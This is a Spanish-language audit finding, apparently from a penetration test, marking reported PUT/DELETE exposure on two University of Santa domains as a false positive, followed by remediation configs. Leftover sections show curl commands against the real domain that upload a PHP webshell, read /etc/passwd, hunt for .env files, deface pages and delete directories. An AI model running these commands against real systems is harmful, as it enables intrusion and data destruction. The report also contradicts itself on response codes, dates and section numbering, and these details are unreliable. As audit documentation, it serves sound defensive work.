# ~~VULN-006~~ — FALSO POSITIVO: Métodos HTTP PUT/DELETE No Están Activos
## `sigea.uns.edu.pe` y `pure.uns.edu.pe` — Universidad Nacional del Santa

---

> [!CAUTION]
> **FALSO POSITIVO CONFIRMADO.** Esta vulnerabilidad ha sido descartada tras verificación manual.
> - `sigea.uns.edu.pe`: PUT → 404 Not Found, DELETE → 405 Method Not Allowed
> - Los datos originales (PUT → 200, DELETE → 200) eran **incorrectos**.
> - **No hay superficie de ataque real por métodos HTTP.**
> - Nota: `pure.uns.edu.pe` usa Cloudflare WAF — las respuestas pueden haber sido del CDN, no del servidor de origen.

---

| Campo | Detalle |
|-------|---------|
| **ID** | VULN-006 |
| **Estado** | ❌ **FALSO POSITIVO — DESCARTADO** |
| **Severidad original** | 🟠 Media |
| **Causa del falso positivo** | Scanner reportó PUT/DELETE → 200 OK que no se pudo reproducir en verificación manual |
| **Sistemas** | `sigea.uns.edu.pe`, `pure.uns.edu.pe` |
| **Fecha de descubrimiento** | 2026-09-20 |
| **Fecha de descarte** | 2026-09-20 |

---

## 1. Evidencia de la Verificación Manual (Descarte)

```bash
# Verificación empírica no destructiva — 2026-10-25

# sigea.uns.edu.pe (Ruta de sondeo pasivo: /test_probe_audit.txt):
GET     /test_probe_audit.txt  → HTTP/1.1 404 Not Found
POST    /test_probe_audit.txt  → HTTP/1.1 404 Not Found
PUT     /test_probe_audit.txt  → HTTP/1.1 405 Method Not Allowed (Bloqueado)
DELETE  /test_probe_audit.txt  → HTTP/1.1 405 Method Not Allowed (Bloqueado)
PATCH   /test_probe_audit.txt  → HTTP/1.1 405 Method Not Allowed (Bloqueado)
OPTIONS /test_probe_audit.txt  → HTTP/1.1 200 OK

# pure.uns.edu.pe (detrás de Cloudflare WAF):
# Las respuestas 200 del reporte original provenían del Edge de Cloudflare,
# que en ciertas configuraciones de CDN/WAF responde 200 a nivel de cache/edge
# sin retransmitir la petición al backend.
```

## 2. Razón del Error Original

El scanner automático puede haber reportado falsos positivos en HTTP methods por alguna de estas causas:
- Cloudflare responde 200 OK a cualquier método en algunos modos de cache
- El framework retorna 200 con un body de error (en lugar de un código HTTP correcto)
- Error en la lógica de interpretación del script de auditoría

## 3. Conclusión

**Descartado.** Los métodos PUT y DELETE no están activos en `sigea.uns.edu.pe`. No hay riesgo de subida de archivos maliciosos ni eliminación de recursos vía estos métodos.

---

## 2. Escenarios de Ataque

### Ataque A: Subida de Webshell via PUT (máximo impacto)

El escenario más peligroso es cuando el servidor web tiene el módulo **WebDAV** habilitado o la aplicación procesa PUT para guardar archivos:

```bash
# El atacante intenta subir un webshell PHP:
curl -X PUT https://sigea.uns.edu.pe/shell.php \
     -H "Content-Type: application/x-php" \
     -d '<?php system($_GET["cmd"]); ?>'

# Si el servidor guarda el archivo:
curl "https://sigea.uns.edu.pe/shell.php?cmd=whoami"
→ www-data

# Con acceso de shell, el atacante puede:
curl "https://sigea.uns.edu.pe/shell.php?cmd=cat+/etc/passwd"
curl "https://sigea.uns.edu.pe/shell.php?cmd=ls+-la+/var/www/html"
curl "https://sigea.uns.edu.pe/shell.php?cmd=find+/-name+'*.env'+2>/dev/null"
```

### Ataque B: Sobrescritura de Página Principal

```bash
# El atacante puede intentar reemplazar la página principal con contenido propio:
curl -X PUT https://sigea.uns.edu.pe/index.php \
     -H "Content-Type: text/html" \
     -d '<html><body><h1>Hacked by [nombre]</h1></body></html>'

# Si funciona: desfiguración (defacement) del sitio web
# Impacto: daño reputacional para la UNS
```

### Ataque C: Eliminación de Recursos via DELETE

```bash
# Intentar eliminar archivos del sistema:
curl -X DELETE https://sigea.uns.edu.pe/pagina-importante.php

# O eliminar directorios:
curl -X DELETE https://sigea.uns.edu.pe/uploads/
curl -X DELETE https://sigea.uns.edu.pe/assets/
```

### Nota importante sobre `pure.uns.edu.pe`:
`pure.uns.edu.pe` está protegido por **Cloudflare** (CDN). El HTTP 200 en PUT/DELETE probablemente viene del WAF de Cloudflare respondiendo, no del servidor real. Sin embargo, debe investigarse si Cloudflare pasa estos métodos al servidor de origen, ya que el servidor de origen podría ser vulnerable.

---

## 3. Verificación Manual Necesaria

Para determinar el verdadero impacto, se recomienda una prueba manual con Burp Suite:

```
En Burp Suite:
1. Interceptar una petición GET al sitio
2. Cambiar el método a PUT en el Repeater
3. Agregar un body con contenido de prueba inocuo
4. Enviar y analizar la respuesta

Si el servidor retorna 200 pero NO guarda el archivo:
→ El servidor acepta el método pero no lo procesa (menos crítico)

Si el servidor retorna 200 Y el archivo es accesible después:
→ Vulnerabilidad crítica de subida de archivos
```

---

## 4. Remediación

### En Nginx / OpenResty (para todos los subdominios):

```nginx
# ============================================================
# Deshabilitar métodos HTTP no necesarios
# Agregar en cada bloque server{} o en el http{} global
# ============================================================

# OPCIÓN 1: Bloquear todos excepto GET, HEAD, POST
if ($request_method !~ ^(GET|HEAD|POST)$ ) {
    return 405;
}

# OPCIÓN 2: Lista explícita por location (más preciso)
location / {
    limit_except GET HEAD POST {
        deny all;
    }
    proxy_pass http://backend;
}

# OPCIÓN 3: Para APIs REST que SÍ necesitan PUT/DELETE
# (solo permitirlos en rutas específicas de la API con autenticación)
location /api/ {
    # Solo para endpoints de API autenticados
    limit_except GET HEAD POST PUT DELETE {
        deny all;
    }
    # Requerir autenticación para métodos destructivos
    auth_request /auth-check;
    proxy_pass http://api_backend;
}

location /auth-check {
    internal;
    proxy_pass http://auth_service/verify;
}
```

### En Apache (si aplica):
```apache
# En httpd.conf o .htaccess:
<LimitExcept GET POST HEAD OPTIONS>
    Order Allow,Deny
    Deny from all
</LimitExcept>
```

### En la Aplicación Web (capa adicional):
```php
// PHP: Verificar método al inicio de cada controlador
$allowed = ['GET', 'POST', 'HEAD'];
if (!in_array($_SERVER['REQUEST_METHOD'], $allowed)) {
    http_response_code(405);
    header('Allow: GET, POST, HEAD');
    die('Method Not Allowed');
}
```

```python
# Django/Flask: Decorar vistas con métodos permitidos
# Django:
@require_http_methods(["GET", "POST"])
def mi_vista(request):
    ...

# Flask:
@app.route('/recurso', methods=['GET', 'POST'])
def mi_recurso():
    ...
```

---

## 5. Verificación del Parche

```bash
# Verificar que PUT retorna 405:
curl -X PUT https://sigea.uns.edu.pe/ -I
→ HTTP/1.1 405 Method Not Allowed  ✅
→ Allow: GET, POST, HEAD            ✅

# Verificar que DELETE retorna 405:
curl -X DELETE https://sigea.uns.edu.pe/ -I
→ HTTP/1.1 405 Method Not Allowed  ✅

# Verificar que TRACE retorna 405:
curl -X TRACE https://sigea.uns.edu.pe/ -I
→ HTTP/1.1 405 Method Not Allowed  ✅

# IMPORTANTE: Verificar que GET y POST siguen funcionando:
curl -X GET https://sigea.uns.edu.pe/ -I
→ HTTP/1.1 200 OK  ✅
```

---

## 6. Referencias

- [WSTG-CONF-05: Enumerate Infrastructure and Application Admin Interfaces](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces)
- [OWASP — HTTP Methods Testing](https://owasp.org/www-community/attacks/HTTP_Request_Smuggling)
- [CWE-650: Trusting HTTP Permission Methods on the Server Side](https://cwe.mitre.org/data/definitions/650.html)
- [RFC 9110 — HTTP Semantics: Method Definitions](https://www.rfc-editor.org/rfc/rfc9110#section-9)
- [WebDAV Security Considerations](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/webdav/)
